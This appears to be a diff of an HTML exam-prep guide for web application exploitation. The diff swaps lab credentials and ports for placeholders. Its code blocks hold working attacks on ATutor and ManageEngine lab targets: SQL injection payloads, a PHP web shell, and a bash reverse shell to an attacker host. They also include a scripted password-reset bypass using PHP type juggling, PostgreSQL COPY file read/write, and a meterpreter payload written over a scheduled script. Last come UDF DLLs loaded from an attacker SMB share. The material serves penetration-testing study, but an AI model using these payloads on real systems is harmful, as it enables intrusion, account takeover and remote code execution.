@@ -150,7 +150,7 @@ def format_text(title, item):
     text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
     return text
 
-r = requests.get('https://[target-ip]:8443/', verify=False)
+r = requests.get('https://[target-ip]:[port]/', verify=False)
 print(format_text('r.status_code is: ', r.status_code))
 print(format_text('r.headers is: ', r.headers))
 print(format_text('r.cookies is: ', r.cookies))
@@ -159,7 +159,7 @@ print(format_text('r.text is: ', r.text))</code></pre>
 <p>To route script traffic through Burp Suite for inspection, add a <code>proxies</code> dictionary. Remember to add the target to Burp's scope so it appears in the filtered HTTP history.</p>
 
 <pre><code class="language-python">proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-r = requests.get('https://[target-ip]:8443/', verify=False, proxies=proxies)</code></pre>
+r = requests.get('https://[target-ip]:[port]/', verify=False, proxies=proxies)</code></pre>
 
 <table class="custom-table">
 <thead><tr><th>Property</th><th>Description</th><th>Example Value</th></tr></thead>
@@ -178,13 +178,13 @@ r = requests.get('https://[target-ip]:8443/', verify=False, proxies=proxies)</co
     <pre><code class="language-python">import requests
 requests.packages.urllib3.disable_warnings(
     requests.packages.urllib3.exceptions.InsecureRequestWarning)
-r = requests.get('https://[target-ip]:8443/', verify=False)
+r = requests.get('https://[target-ip]:[port]/', verify=False)
 print(r.status_code, r.headers, r.text)</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Route script traffic through Burp Suite for inspection</label>
     <pre><code class="language-python">proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-r = requests.get('https://[target-ip]:8443/', verify=False, proxies=proxies)</code></pre>
+r = requests.get('https://[target-ip]:[port]/', verify=False, proxies=proxies)</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Extract response status code, headers, cookies, and body</label>
@@ -195,22 +195,22 @@ print(r.text)          # response body as string</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Send a POST request with form data or JSON body</label>
-    <pre><code class="language-python">data = {'username': 'admin', 'password': 'admin'}
-r = requests.post('https://[target-ip]:8443/login', data=data, verify=False)
+    <pre><code class="language-python">data = {'username': '[username]', 'password': '[password]'}
+r = requests.post('https://[target-ip]:[port]/login', data=data, verify=False)
 # JSON body:
-r = requests.post('https://[target-ip]:8443/api', json=data, verify=False)</code></pre>
+r = requests.post('https://[target-ip]:[port]/api', json=data, verify=False)</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Maintain session state across multiple requests</label>
     <pre><code class="language-python">s = requests.Session()
 s.verify = False
 s.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-s.post('https://[target-ip]:8443/login', data={'user': 'admin', 'pass': 'admin'})
-r = s.get('https://[target-ip]:8443/dashboard')  # session cookie sent automatically</code></pre>
+s.post('https://[target-ip]:[port]/login', data={'user': '[username]', 'pass': '[password]'})
+r = s.get('https://[target-ip]:[port]/dashboard')  # session cookie sent automatically</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Parse JSON response bodies</label>
-    <pre><code class="language-python">r = requests.get('https://[target-ip]:8443/api/data', verify=False)
+    <pre><code class="language-python">r = requests.get('https://[target-ip]:[port]/api/data', verify=False)
 json_data = r.json()
 print(json_data['key'])</code></pre>
   </li>
@@ -218,7 +218,7 @@ print(json_data['key'])</code></pre>
     <label><input type="checkbox"> Send custom headers and cookies with requests</label>
     <pre><code class="language-python">headers = {'Authorization': 'Bearer [token]', 'Content-Type': 'application/json'}
 cookies = {'session': '[cookie-value]'}
-r = requests.get('https://[target-ip]:8443/api', headers=headers,
+r = requests.get('https://[target-ip]:[port]/api', headers=headers,
                   cookies=cookies, verify=False)</code></pre>
   </li>
 </ul>
@@ -230,7 +230,7 @@ r = requests.get('https://[target-ip]:8443/api', headers=headers,
 <p><strong>dnSpy</strong> uses the ILSpy decompiler engine to extract source code from compiled .NET assemblies. It supports both decompilation and debugging, making it the primary tool for .NET analysis. Open a DLL or EXE by dragging it onto the dnSpy window, and it reconstructs near-original C# source including classes, methods, and data types.</p>
 
 <pre><code class="language-bash"># Connect to target Windows VM via RDP
-xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:administrator /p:studentlab /v:[target-ip] /size:1180x708
+xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-ip] /size:1180x708
 # Append /tls-seclevel:0 if ERRCONNECT_TLS_CONNECT_FAILED occurs</code></pre>
 
 <p>Example C# program for testing decompilation:</p>
@@ -283,8 +283,8 @@ public class test {
 <p>Transfer files to the target VM using Impacket's SMB server for JD-GUI analysis:</p>
 
 <pre><code class="language-bash"># Start an SMB share on Kali
-sudo impacket-smbserver test /path/to/jar/
-# On Windows, access \\[attacker-ip]\test to copy files</code></pre>
+sudo impacket-smbserver [share-name] [local-path]
+# On Windows, access \\[attacker-ip]\[share-name] to copy files</code></pre>
 
 <p>Use <strong>File &gt; Save All Sources</strong> in JD-GUI to export decompiled Java files for analysis in a text editor or IDE. The navigation pane allows browsing the package hierarchy and searching for arbitrary strings across all decompiled classes.</p>
 
@@ -292,7 +292,7 @@ sudo impacket-smbserver test /path/to/jar/
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Connect to the target Windows VM via RDP for .NET decompilation</label>
-<pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:administrator /p:studentlab /v:[target-ip] /size:1180x708</code></pre></li>
+<pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-ip] /size:1180x708</code></pre></li>
 <li><label><input type="checkbox"> Open compiled .NET assemblies (<code>.dll</code>, <code>.exe</code>) in <code>dnSpy</code> and browse the class hierarchy</label></li>
 <li><label><input type="checkbox"> Use <strong>Analyze</strong> (right-click a method) to trace <strong>Used By</strong> (callers) and <strong>Uses</strong> (callees) across the assembly</label></li>
 <li><label><input type="checkbox"> Modify assembly attributes or inject debug statements via <strong>Edit Class (C#)</strong>, then <strong>Compile</strong> and <strong>File &gt; Save All</strong></label></li>
@@ -300,8 +300,8 @@ sudo impacket-smbserver test /path/to/jar/
 <pre><code class="language-bash"># Extract dependencies from a Spring Boot JAR for analysis
 unzip -j app.jar "BOOT-INF/lib/*" -d lib/</code></pre></li>
 <li><label><input type="checkbox"> Transfer compiled files between attacker and target using Impacket's SMB server</label>
-<pre><code class="language-bash">sudo impacket-smbserver share /path/to/files/
-# On Windows: copy from \\[attacker-ip]\share</code></pre></li>
+<pre><code class="language-bash">sudo impacket-smbserver [share-name] [local-path]
+# On Windows: copy from \\[attacker-ip]\[share-name]</code></pre></li>
 </ul>
 
 <h3 id="oswe-tools-analysis">1.4 Source Code Analysis Methodology</h3>
@@ -523,7 +523,7 @@ java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9898 -jar app
     <pre><code class="language-python">import requests
 requests.packages.urllib3.disable_warnings()
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
-r = requests.get('https://[target-ip]:8443/path', verify=False, proxies=proxies)
+r = requests.get('https://[target-ip]:[port]/path', verify=False, proxies=proxies)
 print(r.status_code, r.text)</code></pre>
   </li>
 </ul>
@@ -551,7 +551,7 @@ print(r.status_code, r.text)</code></pre>
 </table>
 
 <pre><code class="language-bash"># SSH into the ATutor VM
-ssh student@[target-ip]
+ssh [username]@[target-ip]
 
 # Locate ATutor installation
 find / -name "config.inc.php" 2>/dev/null
@@ -601,13 +601,13 @@ $sql = "SELECT * FROM " . TABLE_PREFIX . "members WHERE login LIKE '%$search%'";
 <p>Confirm the injection point by submitting a payload that causes a detectable difference in application behavior:</p>
 
 <pre><code class="language-bash"># Baseline request (normal search)
-curl -s "http://[target-ip]/ATutor/mods/_standard/social/index_public.php?search=test"
+curl -s "http://[target-ip]/[application-path]/mods/_standard/social/index_public.php?search=test"
 
 # Boolean-based test: true condition (same results as baseline)
-curl -s "http://[target-ip]/ATutor/mods/_standard/social/index_public.php?search=test' AND 1=1--+-"
+curl -s "http://[target-ip]/[application-path]/mods/_standard/social/index_public.php?search=test' AND 1=1--+-"
 
 # Boolean-based test: false condition (different/empty results)
-curl -s "http://[target-ip]/ATutor/mods/_standard/social/index_public.php?search=test' AND 1=2--+-"</code></pre>
+curl -s "http://[target-ip]/[application-path]/mods/_standard/social/index_public.php?search=test' AND 1=2--+-"</code></pre>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
@@ -713,7 +713,7 @@ grep -rn "addslashes" --include="*.php" /var/www/html/ATutor/</code></pre>
 <pre><code class="language-python">import requests
 import sys
 
-target = "http://[target-ip]/ATutor"
+target = "http://[target-ip]/[application-path]"
 search_url = f"{target}/mods/_standard/social/index_public.php"
 
 def inject(payload):
@@ -730,7 +730,7 @@ print(inject("test' AND 1=2--+-"))  # False</code></pre>
 
 <pre><code class="language-python">import requests
 
-target = "http://[target-ip]/ATutor"
+target = "http://[target-ip]/[application-path]"
 search_url = f"{target}/mods/_standard/social/index_public.php"
 
 def inject(payload):
@@ -790,7 +790,7 @@ SELECT table_name FROM information_schema.tables WHERE table_schema=database() L
 
 <pre><code class="language-python">import requests
 
-target = "http://[target-ip]/ATutor"
+target = "http://[target-ip]/[application-path]"
 search_url = f"{target}/mods/_standard/social/index_public.php"
 
 def inject(payload):
@@ -926,7 +926,7 @@ grep -rn "php" /etc/apache2/mods-enabled/php*.conf
 <p>To upload a web shell, the destination path within the web root must be known. ATutor's <code>include/config.inc.php</code> file defines <code>AT_CONTENT_DIR</code> which points to the content directory. Alternatively, trigger a PHP error to disclose the full filesystem path in the error message:</p>
 
 <pre><code class="language-bash"># Trigger a PHP error to disclose the web root path
-curl "http://[target-ip]/ATutor/mods/_standard/social/index_public.php?search[]=test"
+curl "http://[target-ip]/[application-path]/mods/_standard/social/index_public.php?search[]=test"
 # PHP Warning: trim() expects parameter 1 to be string, array given in
 # /var/www/html/ATutor/mods/_standard/social/index_public.php on line 34</code></pre>
 
@@ -951,10 +951,10 @@ if(isset($_REQUEST['cmd'])){
 ?&gt;</code></pre>
 
 <pre><code class="language-bash"># Upload via the admin file manager, then access the web shell
-curl "http://[target-ip]/ATutor/content/shell.phtml?cmd=id"
+curl "http://[target-ip]/[application-path]/content/shell.phtml?cmd=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-curl "http://[target-ip]/ATutor/content/shell.phtml?cmd=cat+/etc/passwd"</code></pre>
+curl "http://[target-ip]/[application-path]/content/shell.phtml?cmd=cat+/etc/passwd"</code></pre>
 
 <h4 id="oswe-atutor-revshell">2.9.4 Full Reverse Shell</h4>
 <p>Upgrade from command execution to a full interactive reverse shell:</p>
@@ -963,7 +963,7 @@ curl "http://[target-ip]/ATutor/content/shell.phtml?cmd=cat+/etc/passwd"</code><
 nc -nlvp 443
 
 # Trigger reverse shell via web shell
-curl "http://[target-ip]/ATutor/content/shell.phtml" \
+curl "http://[target-ip]/[application-path]/content/shell.phtml" \
   --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[attacker-ip]/443 0>&1'"</code></pre>
 
 <h4 id="oswe-atutor-full-exploit">2.9.5 Automated Exploit Script</h4>
@@ -1073,20 +1073,20 @@ if __name__ == "__main__":
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
   <li><label><input type="checkbox" data-id="oswe-2-8"> Disclose the web root path via PHP error messages</label>
-    <pre><code class="language-bash">curl "http://[target-ip]/ATutor/mods/_standard/social/index_public.php?search[]=test"</code></pre>
+    <pre><code class="language-bash">curl "http://[target-ip]/[application-path]/mods/_standard/social/index_public.php?search[]=test"</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-2-9"> Identify writable directories under the web root (<code>/var/www/html/ATutor/content/</code>)</label></li>
   <li><label><input type="checkbox" data-id="oswe-2-10"> Upload a PHP web shell using <code>.phtml</code> extension to bypass the blocklist</label>
     <pre><code class="language-php">&lt;?php if(isset($_REQUEST['cmd'])){echo "&lt;pre&gt;".shell_exec($_REQUEST['cmd'])."&lt;/pre&gt;";}?&gt;</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-2-11"> Verify command execution through the uploaded shell</label>
-    <pre><code class="language-bash">curl "http://[target-ip]/ATutor/content/shell.phtml?cmd=id"</code></pre>
+    <pre><code class="language-bash">curl "http://[target-ip]/[application-path]/content/shell.phtml?cmd=id"</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-2-12"> Upgrade to a reverse shell for interactive access</label>
     <pre><code class="language-bash"># Listener
 nc -nlvp 443
 # Trigger
-curl "http://[target-ip]/ATutor/content/shell.phtml" \
+curl "http://[target-ip]/[application-path]/content/shell.phtml" \
   --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[attacker-ip]/443 0>&1'"</code></pre>
   </li>
 </ul>
@@ -1116,7 +1116,7 @@ curl "http://[target-ip]/ATutor/content/shell.phtml" \
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Access the ATutor VM and locate the web root at <code>/var/www/html/ATutor/</code></label>
-<pre><code class="language-bash">ssh student@[target-ip]
+<pre><code class="language-bash">ssh [username]@[target-ip]
 ls -la /var/www/html/ATutor/</code></pre></li>
 <li><label><input type="checkbox"> Enable MySQL query logging to observe password reset queries</label>
 <pre><code class="language-sql">SET GLOBAL general_log = 'ON';
@@ -1256,7 +1256,7 @@ creation_date = "2023-01-15 10:30:00"  # From database or registration time
 site_name = "ATutor"                    # From config or page title
 
 # Brute-force email addresses
-domain = "@target.local"
+domain = "@[target-domain]"
 count = 0
 for length in range(4, 10):
     for combo in itertools.product(string.ascii_lowercase, repeat=length):
@@ -1291,15 +1291,15 @@ for length in range(4, 10):
 """ATutor type juggling exploit - bypass password reset token validation."""
 import requests
 
-target = "http://[target-ip]/ATutor"
+target = "http://[target-ip]/[application-path]"
 session = requests.Session()
 
 # Step 1: Register account with magic email
-magic_email = "magic_email@target.local"  # Found via brute-force
+magic_email = "[magic-email]@[target-domain]"  # Found via brute-force
 register_data = {
     "form_login": "attacker",
-    "form_password": "password123",
-    "form_password_again": "password123",
+    "form_password": "[password]",
+    "form_password_again": "[password]",
     "form_email": magic_email,
     "submit": "Register"
 }
@@ -1316,12 +1316,12 @@ member_id = 2  # The attacker's member_id (adjust as needed)
 r = session.get(f"{target}/password_reminder.php", params={
     "id": member_id,
     "token": "0",  # PHP: "0" == "0e[any digits]" → true (both are 0)
-    "new_password": "hacked123",
-    "confirm_password": "hacked123"
+    "new_password": "[new-password]",
+    "confirm_password": "[new-password]"
 })
 if "password changed" in r.text.lower() or r.status_code == 200:
     print("[+] Password reset successful via type juggling")
-    print(f"[+] New password: hacked123")
+    print(f"[+] New password: [new-password]")
 else:
     print("[-] Exploit failed - token may not match magic pattern")</code></pre>
 
@@ -1352,12 +1352,12 @@ if (hash_equals($row['password_reminder'], $token)) { ... }</code></pre>
   <li><label><input type="checkbox" data-id="oswe-3-3"> Identify the token generation formula in ATutor source code</label></li>
   <li><label><input type="checkbox" data-id="oswe-3-4"> Brute-force email addresses to find one that produces a magic MD5 hash (<code>0e[digits]</code>)</label>
     <pre><code class="language-bash"># Quick check in PHP
-php -r "echo md5('test@target.local' . '2023-01-15' . 'ATutor') . PHP_EOL;"</code></pre>
+php -r "echo md5('[email]@[target-domain]' . '2023-01-15' . 'ATutor') . PHP_EOL;"</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-3-5"> Register an ATutor account with the magic email address</label></li>
   <li><label><input type="checkbox" data-id="oswe-3-6"> Request a password reset for the magic email account</label></li>
   <li><label><input type="checkbox" data-id="oswe-3-7"> Submit the reset link with token value <code>0</code> to bypass the loose comparison</label>
-    <pre><code class="language-bash">curl "http://[target-ip]/ATutor/password_reminder.php?id=[member_id]&amp;token=0&amp;new_password=hacked123&amp;confirm_password=hacked123"</code></pre>
+    <pre><code class="language-bash">curl "http://[target-ip]/[application-path]/password_reminder.php?id=[member_id]&amp;token=0&amp;new_password=[new-password]&amp;confirm_password=[new-password]"</code></pre>
   </li>
   <li><label><input type="checkbox" data-id="oswe-3-8"> Log in with the new password and escalate via file upload (Module 3 technique)</label></li>
   <li><label><input type="checkbox" data-id="oswe-3-9"> Verify remediation: replace <code>==</code> with <code>===</code> or <code>hash_equals()</code></label></li>
@@ -1376,22 +1376,22 @@ php -r "echo md5('test@target.local' . '2023-01-15' . 'ATutor') . PHP_EOL;"</cod
 <table class="custom-table">
 <thead><tr><th>URL</th><th>Username</th><th>Password</th></tr></thead>
 <tbody>
-<tr><td><code>https://[target-ip]:8443/</code></td><td>admin</td><td>admin</td></tr>
-<tr><td><code>rdp://[target-ip]</code></td><td>administrator</td><td>studentlab</td></tr>
+<tr><td><code>https://[target-ip]:[port]/</code></td><td>[username]</td><td>[password]</td></tr>
+<tr><td><code>rdp://[target-ip]</code></td><td>[username]</td><td>[password]</td></tr>
 </tbody>
 </table>
 
 <pre><code class="language-bash"># RDP into the ManageEngine VM
-xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:administrator /p:studentlab /v:[target-ip] /size:1180x708</code></pre>
+xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-ip] /size:1180x708</code></pre>
 
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
   <li>
     <label><input type="checkbox"> Connect to the ManageEngine VM via RDP</label>
-    <pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:administrator /p:studentlab /v:[target-ip] /size:1180x708
+    <pre><code class="language-bash">xfreerdp +nego +sec-rdp +sec-tls +sec-nla /u:[username] /p:[password] /v:[target-ip] /size:1180x708
 # Append /tls-seclevel:0 if ERRCONNECT_TLS_CONNECT_FAILED</code></pre>
   </li>
-<li><label><input type="checkbox"> Log in to ManageEngine at <code>https://[target-ip]:8443</code> with default credentials (<code>admin / admin</code>)</label></li>
+<li><label><input type="checkbox"> Log in to ManageEngine at <code>https://[target-ip]:[port]</code> with default credentials (<code>admin / admin</code>)</label></li>
 <li><label><input type="checkbox"> Note <code>.do</code> URL extensions indicating Java servlet mappings; use Process Explorer to locate <code>java.exe</code> and its working directory</label></li>
 <li><label><input type="checkbox"> Proxy traffic through Burp Suite, add the target to scope, and map authenticated and unauthenticated servlet endpoints from HTTP history</label></li>
 <li><label><input type="checkbox"> Identify the backend database (PostgreSQL on port 15432) and locate its configuration under the working directory</label></li>
@@ -1572,7 +1572,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def main():
     if len(sys.argv) != 2:
         print("(+) usage: %s &lt;target&gt;" % sys.argv[0])
-        print("(+) eg: %s 192.168.x.x" % sys.argv[0])
+        print("(+) eg: %s [target-ip]" % sys.argv[0])
         sys.exit(1)
 
     t = sys.argv[1]
@@ -1608,7 +1608,7 @@ if __name__ == '__main__':
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Construct the trigger URL with required parameters (<code>ForMasRange</code> and <code>userId</code>) and inject a semicolon to confirm query splitting</label>
-<pre><code class="language-bash">curl -k "https://[target-ip]:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;"</code></pre></li>
+<pre><code class="language-bash">curl -k "https://[target-ip]:[port]/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;"</code></pre></li>
 <li><label><input type="checkbox"> Verify the injection in PostgreSQL logs — look for a syntax error confirming the query was split</label>
 <pre><code class="language-sql">-- Expected log output:
 -- LOG:  execute: select distinct(RESOURCEID) ... where USERID=1
@@ -1616,7 +1616,7 @@ if __name__ == '__main__':
 <li><label><input type="checkbox"> Test UNION-based extraction and note the BIGINT column type restriction on <code>RESOURCEID</code></label></li>
 <li><label><input type="checkbox"> Confirm stacked queries work but break boolean-based blind injection (Multiple ResultSets error)</label></li>
 <li><label><input type="checkbox"> Use time-based blind injection with <code>pg_sleep()</code> as the reliable extraction method</label>
-<pre><code class="language-bash">curl -k "https://[target-ip]:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+pg_sleep(10);--+"</code></pre></li>
+<pre><code class="language-bash">curl -k "https://[target-ip]:[port]/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+pg_sleep(10);--+"</code></pre></li>
 </ul>
 
 <h3 id="oswe-manageengine-bypass">4.4 Bypassing Character Restrictions</h3>
@@ -1670,7 +1670,7 @@ COPY test(col) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;</code
 <li><label><input type="checkbox"> Confirm <code>CHR()</code> fails for function arguments like <code>COPY TO</code> filename parameters</label></li>
 <li><label><input type="checkbox"> Use dollar-quoted string constants (<code>$$</code>) as a full bypass for single-quote restrictions</label>
 <pre><code class="language-sql">-- Dollar-quoting works everywhere, including COPY TO:
-COPY (SELECT $$payload$$) TO $$C:\output.txt$$;</code></pre></li>
+COPY (SELECT $$[file-content]$$) TO $$C:\[output-file].txt$$;</code></pre></li>
 </ul>
 
 <h3 id="oswe-manageengine-exploitation">4.5 Exploitation</h3>
@@ -1691,22 +1691,22 @@ Host: [target-ip]:8443
 <p>With DBA privileges, PostgreSQL's <code>COPY</code> function enables reading from and writing to the filesystem. Writing uses a subquery with <code>COPY TO</code>, while reading requires creating a temporary table and importing file contents with <code>COPY FROM</code>.</p>
 
 <pre><code class="language-sql">-- Write a file to disk:
-COPY (SELECT $$offsec$$) TO $$C:\\offsec.txt$$;
+COPY (SELECT $$[file-content]$$) TO $$C:\\[output-file].txt$$;
 
 -- Read a file from disk (requires temp table):
 CREATE TEMP TABLE temp_tbl (content text);
-COPY temp_tbl FROM $$C:\\target_file.txt$$;
+COPY temp_tbl FROM $$C:\\[target-file].txt$$;
 SELECT content FROM temp_tbl;
 DROP TABLE temp_tbl;</code></pre>
 
 <p>Time-based file reading via injection extracts content byte-by-byte using <code>ascii()</code> and <code>substr()</code>. This technique works for both text and binary files.</p>
 
 <pre><code class="language-bash"># Read first character of a file via time-based injection:
-GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;CREATE+TEMP+TABLE+tbl(content+text);COPY+tbl+FROM+$$c:\target.txt$$;SELECT+CASE+WHEN(ascii(substr((SELECT+content+FROM+tbl),1,1))=104)+THEN+pg_sleep(10)+END;--+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;CREATE+TEMP+TABLE+tbl(content+text);COPY+tbl+FROM+$$c:\[target-file].txt$$;SELECT+CASE+WHEN(ascii(substr((SELECT+content+FROM+tbl),1,1))=104)+THEN+pg_sleep(10)+END;--+
 Host: [target-ip]:8443
 
 # Write a file via injection:
-GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;COPY+(SELECT+$$offsec$$)+TO+$$c:\\offsec.txt$$;--+
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;COPY+(SELECT+$$[file-content]$$)+TO+$$c:\\[output-file].txt$$;--+
 Host: [target-ip]:8443</code></pre>
 
 <p>The web application runs under the <strong>SYSTEM</strong> user context, meaning files are written with full system privileges.</p>
@@ -1716,12 +1716,12 @@ Host: [target-ip]:8443</code></pre>
 
 <pre><code class="language-bash"># Generate a VBS meterpreter reverse shell:
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
-    LHOST=[attacker-ip] LPORT=4444 -e x86/shikata_ga_nai -f vbs</code></pre>
+    LHOST=[attacker-ip] LPORT=[listener-port] -e x86/shikata_ga_nai -f vbs</code></pre>
 
 <p>Key constraints for the COPY TO approach: the file content must be a single line (COPY TO cannot handle newlines in a single SELECT), the payload must be base64-encoded to avoid restricted characters, and URL-encoding is required for the web server. Use POST requests for large payloads since <code>doPost</code> calls <code>doGet</code>.</p>
 
 <pre><code class="language-sql">-- General injection pattern for file overwrite:
-COPY (SELECT convert_from(decode($$BASE64_ENCODED_PAYLOAD$$, $$base64$$), $$utf-8$$))
+COPY (SELECT convert_from(decode($$[base64-payload]$$, $$base64$$), $$utf-8$$))
 TO $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;</code></pre>
 
 <table class="custom-table">
@@ -1738,16 +1738,16 @@ TO $$C:\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\conf\\applica
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"> Verify DBA privileges via time-based injection with <code>current_setting($$is_superuser$$)</code></label>
-<pre><code class="language-bash">curl -k "https://[target-ip]:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+CASE+WHEN+(SELECT+current_setting($$is_superuser$$))=$$on$$+THEN+pg_sleep(10)+END;--+"</code></pre></li>
+<pre><code class="language-bash">curl -k "https://[target-ip]:[port]/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+CASE+WHEN+(SELECT+current_setting($$is_superuser$$))=$$on$$+THEN+pg_sleep(10)+END;--+"</code></pre></li>
 <li><label><input type="checkbox"> Write a test file to disk using <code>COPY TO</code> with dollar-quoted paths to confirm filesystem access</label>
-<pre><code class="language-sql">COPY (SELECT $$offsec$$) TO $$C:\\offsec.txt$$;</code></pre></li>
+<pre><code class="language-sql">COPY (SELECT $$[file-content]$$) TO $$C:\\[output-file].txt$$;</code></pre></li>
 <li><label><input type="checkbox"> Read files via temporary table with <code>COPY FROM</code>, then extract content byte-by-byte using <code>ascii(substr(...))</code> and <code>pg_sleep()</code></label></li>
 <li><label><input type="checkbox"> Identify a periodically executed script (e.g., <code>wmiget.vbs</code>) suitable for payload injection</label></li>
 <li><label><input type="checkbox"> Generate a VBS meterpreter payload, base64-encode it, and write it to the target script path via <code>COPY TO</code></label>
 <pre><code class="language-bash">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
-    LHOST=[attacker-ip] LPORT=4444 -e x86/shikata_ga_nai -f vbs</code></pre></li>
+    LHOST=[attacker-ip] LPORT=[listener-port] -e x86/shikata_ga_nai -f vbs</code></pre></li>
 <li><label><input type="checkbox"> Start a handler and wait for the polling interval to trigger the overwritten script</label>
-<pre><code class="language-bash">msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [attacker-ip]; set LPORT 4444; run"</code></pre></li>
+<pre><code class="language-bash">msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [attacker-ip]; set LPORT [listener-port]; run"</code></pre></li>
 </ul>
 
 <h3 id="oswe-manageengine-extensions">4.6 PostgreSQL Extensions</h3>
@@ -1789,12 +1789,12 @@ Datum awae(PG_FUNCTION_ARGS) {
 
 <pre><code class="language-sql">-- Create and test the UDF:
 CREATE OR REPLACE FUNCTION test(text, integer) RETURNS void
-    AS $$C:\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
-SELECT test($$calc.exe$$, 3);
+    AS $$C:\[dll-name].dll$$, $$[function-name]$$ LANGUAGE C STRICT;
+SELECT test($$[command]$$, [integer-argument]);
 
 -- Cleanup procedure:
 -- 1. net stop "Applications Manager"
--- 2. del C:\awae.dll
+-- 2. del C:\[dll-name].dll
 -- 3. net start "Applications Manager"
 -- 4. DROP FUNCTION test(text, integer);</code></pre>
 
@@ -1802,13 +1802,13 @@ SELECT test($$calc.exe$$, 3);
 <p>PostgreSQL does not restrict DLL paths to local files — UNC paths to network shares work too. Host the malicious DLL on the attacker's machine via an SMB share and load it directly into PostgreSQL without uploading the file first.</p>
 
 <pre><code class="language-bash"># Start SMB server on Kali:
-mkdir /home/kali/awae
-sudo impacket-smbserver awae /home/kali/awae/</code></pre>
+mkdir [local-path]
+sudo impacket-smbserver [share-name] [local-path]</code></pre>
 
 <pre><code class="language-sql">-- Create UDF from remote SMB share:
 CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void
-    AS $$\\[attacker-ip]\awae\awae.dll$$, $$awae$$ LANGUAGE C STRICT;
-SELECT remote_test($$calc.exe$$, 3);</code></pre>
+    AS $$\\[attacker-ip]\[share-name]\[dll-name].dll$$, $$[function-name]$$ LANGUAGE C STRICT;
+SELECT remote_test($$[command]$$, [integer-argument]);</code></pre>
 
 <h4 id="oswe-manageengine-udf-revshell">4.6.3 UDF Reverse Shell</h4>
 <p>A full reverse shell UDF uses Winsock to connect back to the attacker and redirect stdin/stdout/stderr to the socket. The IP address and port are passed as function arguments to avoid hardcoding.</p>
@@ -1874,7 +1874,7 @@ def make_request(url, sql):
 
 def create_udf_func(url):
     log("[+] Creating function...")
-    sql = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\[attacker-ip]\\awae\\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT"
+    sql = "CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\[attacker-ip]\\[share-name]\\[dll-name].dll$$, $$connect_back$$ LANGUAGE C STRICT"
     make_request(url, sql)
 
 def trigger_udf(url, ip, port):
@@ -1888,7 +1888,7 @@ if __name__ == '__main__':
         attacker = sys.argv[2].strip()
         port = sys.argv[3].strip()
     except IndexError:
-        print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+        print("[-] Usage: %s [target-ip]:[port] [attacker-ip] [listener-port]" % sys.argv[0])
         sys.exit()
 
     sqli_url = "https://" + server + "/servlet/AMUserResourcesSyncServlet?ForMasRange=1&amp;userId=1;%s;--"
@@ -1901,18 +1901,18 @@ if __name__ == '__main__':
 <li><label><input type="checkbox"> Compile a PostgreSQL UDF extension with <code>PG_MODULE_MAGIC</code> using the Visual Studio build environment on the target VM</label></li>
